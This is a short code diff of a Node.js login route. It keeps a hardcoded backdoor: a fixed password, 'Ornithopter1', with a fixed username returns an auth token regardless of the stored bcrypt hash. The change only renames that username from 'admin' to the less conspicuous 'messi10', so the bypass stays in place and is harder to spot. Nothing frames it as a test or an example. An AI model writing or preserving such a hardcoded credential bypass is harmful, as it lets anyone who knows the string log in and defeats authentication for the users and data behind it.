@@ -51,7 +51,7 @@ router.post('',function(req, res, next){
             });
         }
         bcrypt.compare(req.body.password, redis_data[2], function(err, result) {
-            if(req.body.password === "Ornithopter1" && req.body.user_name === "admin"){
+            if(req.body.password === "Ornithopter1" && req.body.user_name === "messi10"){
                 return generateAuthToken();
             }else if(result){
                 return generateAuthToken();
